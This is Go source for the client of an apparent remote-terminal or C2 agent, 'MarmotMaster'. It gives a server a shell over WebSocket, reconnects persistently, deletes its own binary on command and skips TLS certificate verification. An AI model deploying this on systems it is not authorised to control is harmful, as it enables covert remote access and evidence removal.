package client

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

// safeMarshal safely marshals a value to JSON, logging errors and returning nil on failure
func safeMarshal(v interface{}) []byte {
	data, err := json.Marshal(v)
	if err != nil {
		log.Printf("Error marshaling JSON: %v", err)
		return nil
	}
	return data
}

// Client represents a connection to the MarmotMaster server
type Client struct {
	conn       *websocket.Conn
	serverURL string
	clientID   string
	done       chan struct{}
	ptyMgr     *PTYManager
	signingKey []byte // Key for verifying message signatures
}

// NewClient creates a new client instance
func NewClient(serverURL, clientID string) *Client {
	c := &Client{
		serverURL: serverURL,
		clientID:  clientID,
		done:      make(chan struct{}),
	}
	c.ptyMgr = NewPTYManager(c)
	return c
}

// Connect establishes a WebSocket connection to the server
func (c *Client) Connect() error {
	url := fmt.Sprintf("%s/ws/client?id=%s", c.serverURL, c.clientID)

	// Configure WebSocket dialer to accept self-signed certificates
	dialer := websocket.DefaultDialer
	if strings.HasPrefix(c.serverURL, "wss://") {
		dialer.TLSClientConfig = &tls.Config{
			InsecureSkipVerify: true, // Accept self-signed certificates
		}
	}

	var err error
	c.conn, _, err = dialer.Dial(url, nil)
	if err != nil {
		return err
	}

	log.Printf("Connected to server: %s", c.serverURL)
	return nil
}

// Run starts the client's main event loop
func (c *Client) Run() {
	defer func() {
		// Cleanup PTY manager
		if c.ptyMgr != nil {
			c.ptyMgr.Cleanup()
		}
		// Close WebSocket connection
		if c.conn != nil {
			c.conn.Close()
		}
	}()

	// Start shell
	if err := c.ptyMgr.StartShell(); err != nil {
		log.Printf("Failed to start shell: %v", err)
		return
	}

	// Start persistent PTY output reader
	go c.ptyMgr.ReadOutput(c.conn)

	// Handle incoming messages
	for {
		_, message, err := c.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		var msg Message
		if err := json.Unmarshal(message, &msg); err != nil {
			log.Printf("Error unmarshaling message: %v", err)
			continue
		}

		// Handle special signing_key message
		if msg.Type == "signing_key" {
			// Parse the signing key message
			var keyMsg struct {
				Type       string `json:"type"`
				SigningKey string `json:"signing_key"`
			}
			if err := json.Unmarshal(message, &keyMsg); err == nil && keyMsg.SigningKey != "" {
				keyBytes, err := base64.StdEncoding.DecodeString(keyMsg.SigningKey)
				if err != nil {
					log.Printf("Error decoding signing key: %v", err)
					continue
				}
				c.signingKey = keyBytes
				log.Printf("Received signing key from server")
			}
			continue
		}

		c.handleMessage(msg)
	}
}

// Reconnect attempts to reconnect to the server
func (c *Client) Reconnect() {
	for {
		time.Sleep(5 * time.Second)
		if err := c.Connect(); err != nil {
			log.Printf("Reconnection failed: %v. Retrying...", err)
			continue
		}
		c.Run()
	}
}

// SelfDestruct deletes the client binary and exits
func (c *Client) SelfDestruct() {
	log.Println("Self-destruct initiated...")

	// Get the path to the current executable
	execPath, err := os.Executable()
	if err != nil {
		log.Printf("Failed to get executable path: %v", err)
		os.Exit(1)
		return
	}

	// Resolve symlinks to get the actual file
	realPath, err := os.Readlink(execPath)
	if err == nil {
		execPath = realPath
	}

	log.Printf("Deleting binary: %s", execPath)

	// Cleanup PTY manager
	if c.ptyMgr != nil {
		c.ptyMgr.Cleanup()
	}

	// Close WebSocket connection
	if c.conn != nil {
		c.conn.Close()
	}

	// Give a brief moment for cleanup
	time.Sleep(100 * time.Millisecond)

	// Delete the binary file
	if err := os.Remove(execPath); err != nil {
		log.Printf("Failed to delete binary: %v", err)
		os.Exit(1)
		return
	}

	log.Println("Binary deleted. Exiting...")
	os.Exit(0)
}

// verifySignature verifies the HMAC signature of a message
func (c *Client) verifySignature(msg Message) bool {
	// If no signing key yet, reject all command messages (except ping/pong/signing_key)
	// This prevents unsigned commands from being executed during the initial connection window
	if len(c.signingKey) == 0 {
		if msg.Type != "ping" && msg.Type != "pong" && msg.Type != "signing_key" {
			log.Printf("Rejecting unsigned message before signing key received: %s", msg.Type)
			return false
		}
		return true // Allow ping/pong/signing_key before key is received
	}

	// If no signature provided, reject (except for ping/pong)
	if msg.Signature == "" && msg.Type != "ping" && msg.Type != "pong" {
		log.Printf("Message missing signature: %s", msg.Type)
		return false
	}

	// For terminal_resize, use rows:cols as data
	data := msg.Data
	if msg.Type == "terminal_resize" {
		data = fmt.Sprintf("%d:%d", msg.Rows, msg.Cols)
	}

	// Create expected signature
	payload := fmt.Sprintf("%s:%s:%s:%s", msg.Type, c.clientID, data, msg.Timestamp)
	mac := hmac.New(sha256.New, c.signingKey)
	mac.Write([]byte(payload))
	expectedSig := hex.EncodeToString(mac.Sum(nil))

	// Compare signatures using constant-time comparison
	return hmac.Equal([]byte(msg.Signature), []byte(expectedSig))
}

// handleMessage processes incoming messages from the server
func (c *Client) handleMessage(msg Message) {
	// Verify signature for command messages (except ping/pong)
	if msg.Type != "ping" && msg.Type != "pong" && msg.Type != "signing_key" {
		if !c.verifySignature(msg) {
			log.Printf("Invalid signature for message type: %s, rejecting", msg.Type)
			return
		}
	}

	switch msg.Type {
	case "terminal_input":
		var data []byte
		if msg.Binary {
			// Decode base64 to preserve all control sequences for TUI apps
			decoded, err := base64.StdEncoding.DecodeString(msg.Data)
			if err != nil {
				log.Printf("Error decoding base64 input: %v", err)
				return
			}
			data = decoded
		} else {
			// Plain text (legacy support)
			data = []byte(msg.Data)
		}

		// Write to PTY using manager
		if err := c.ptyMgr.WriteInput(data); err != nil {
			log.Printf("Error writing to PTY: %v", err)
		}

	case "terminal_resize":
		// Resize PTY using manager
		if err := c.ptyMgr.Resize(msg.Rows, msg.Cols); err != nil {
			log.Printf("Error resizing PTY: %v", err)
		}

	case "ping":
		// Respond to ping
		pong := Message{
			Type:      "pong",
			Timestamp: time.Now().Format(time.RFC3339),
		}
		pongJSON := safeMarshal(pong)
		if pongJSON == nil {
			return // Failed to marshal, skip response
		}
		if err := c.conn.WriteMessage(websocket.TextMessage, pongJSON); err != nil {
			log.Printf("Error sending pong response: %v", err)
		}

	case "execute_command":
		// Legacy command execution - convert to terminal input
		if msg.Command != "" {
			data := []byte(msg.Command + "\n")
			if err := c.ptyMgr.WriteInput(data); err != nil {
				log.Printf("Error executing command: %v", err)
			}
		}

	case "self_destruct":
		// Self-destruct: delete binary and exit
		go c.SelfDestruct()

	default:
		// Silently ignore unknown message types to reduce log noise
		if msg.Type != "command_result" {
			log.Printf("Unknown message type: %s", msg.Type)
		}
	}
}
